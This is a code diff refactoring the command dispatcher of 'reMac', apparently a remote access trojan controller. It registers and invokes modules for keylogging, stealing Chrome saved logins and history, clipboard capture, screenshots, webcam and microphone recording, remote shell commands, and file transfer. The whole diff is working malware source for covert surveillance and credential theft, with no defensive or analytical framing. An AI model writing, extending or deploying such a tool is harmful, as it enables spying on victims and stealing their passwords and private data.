@@ -1,40 +1,27 @@
-# -*- coding: utf-8 -*-
-# __author__ = "J3T3D0nn3r"
-# __license__ = "GPLv3"
-
 import sys
-from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins
-from apps.server.modules import mod_chrome_history
-from apps.server.modules import mod_shellcmd
-from apps.server.modules import mod_screenshot
-from apps.server.modules import mod_webcam
-from apps.server.modules import mod_recmic
-from apps.server.modules import mod_modHelp
-from apps.server.modules import mod_info
-from apps.server.modules import mod_download
-from apps.server.modules import mod_upload
-from apps.server.modules import mod_help
+
+from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins, mod_chrome_history
+from apps.server.modules import mod_shellcmd, mod_screenshot, mod_webcam, mod_recmic, mod_modHelp, mod_info
+from apps.server.modules import mod_download, mod_upload, mod_help
 
 from apps.libs.reMac_libbase import reMac_libbase
 
-
-reMacModules = {
-    'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw', 'helloworld'],
-    'cb': [mod_clipboard.mod_clipboard(), 'clipboard', 'Call clipboard module', 'cb', 'clipboard'],
-    'ch': [mod_chrome_history.mod_chrome_history(), 'chromehist', 'Call Chrome-History module', 'ch', 'chromechistory'],
-    'cl': [mod_chrome_logins.mod_chrome_logins(), 'chromelogin', 'Call Chrome-Logins module', 'cl', 'chromelogin'],
-    'sh': [mod_shellcmd.mod_shellcmd(), 'shellcmd', 'Call shell command module', 'sh <cmd to send>', 'shellcmd'],
-    'sc': [mod_screenshot.mod_screenshot(), 'screenshot', 'Call screenshot module', 'sc', 'screenshot'],
-    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc [-t <seconds to warmup>]', 'webcam'],
-    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module (NOT WORKING YET)', 'kl', 'keylogger'],
-    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm [-t <seconds to record>]', 'microphone'],
-    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>', 'modhelp'],
-    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in', 'info'],
-    'dl': [mod_download.mod_download(), 'download', 'Call download module (to app "/tmp")', 'dl <remote filename>', 'download'],
-    'ul': [mod_upload.mod_upload(), 'upload', 'Call upload module (to app "/tmp")', 'ul <local filename>', 'upload'],
-    'hp': [mod_help.mod_help(), 'help', 'Call help module', 'hp', 'help']
-}
-
+reMacModules = [
+    mod_hello.mod_hello(),
+    mod_clipboard.mod_clipboard(),
+    mod_chrome_history.mod_chrome_history(),
+    mod_chrome_logins.mod_chrome_logins(),
+    mod_shellcmd.mod_shellcmd(),
+    mod_screenshot.mod_screenshot(),
+    mod_webcam.mod_webcam(),
+    mod_keylogger.mod_keylogger(),
+    mod_recmic.mod_recmic(),
+    mod_modHelp.mod_modHelp(),
+    mod_info.mod_info(),
+    mod_download.mod_download(),
+    mod_upload.mod_upload(),
+    mod_help.mod_help()
+]
 
 class reMac_libserver(reMac_libbase):
     def __init__(self, selector, sock, addr):
@@ -75,9 +62,13 @@ class reMac_libserver(reMac_libbase):
                     self.close()
 
     def processInput(self, input, value = ""):
-        if input == "q":  # or input == "quit":
+
+        for mod in reMacModules:
+            print(f'{mod.cmd_short}, {mod.cmd_long}, {mod.cmd_desc}')
+
+        if input == "q":
             sys.exit(1)
-        elif input == "h":  # or input == "help":
+        elif input == "h":
             # print_help()
             pass
         elif input == "hw" \
@@ -85,25 +76,33 @@ class reMac_libserver(reMac_libbase):
                 or input == "cl" \
                 or input == "wc" \
                 or input == "hp" \
-                or input == "d":  # or input == "help":
-            return reMacModules[input][0].run_mod()
+                or input == "d":
+            for mod in reMacModules:
+                if mod.cmd_short == input:
+                    return mod.run_mod()
         elif input == "dl" \
                 or input == "ul" \
                 or input == "in" \
                 or input == "cb" \
                 or input == "rm" \
                 or input == "sc":
-            return reMacModules[input][0].run_mod(input, value)
+            for mod in reMacModules:
+                if mod.cmd_short == input:
+                    return mod.run_mod(input, value)
         elif input == "sh":
-            if reMacModules["sh"][0].running == True:
-                reMacModules["sh"][0].command = value
-            else:
-                return reMacModules["sh"][0].run_cmd(input, value)
+            for mod in reMacModules:
+                if mod.cmd_short == input:
+                    if mod.running == True:
+                        mod.command = value
+                        break
+                    else:
+                        return mod.run_cmd(input, value)
         elif input.startswith("mh"):
-            return reMacModules["mh"][0].print_client_help("reMac", reMacModules, value)
+            for mod in reMacModules:
+                if mod.cmd_short == input:
+                    return mod.print_client_help("reMac", reMacModules, value)
         else:
             print(f"Command '{input}' NOT FOUND! Check the following command list")
-            # print_help()
 
     def _create_response_json_content(self):
         action = self.request.get("action")
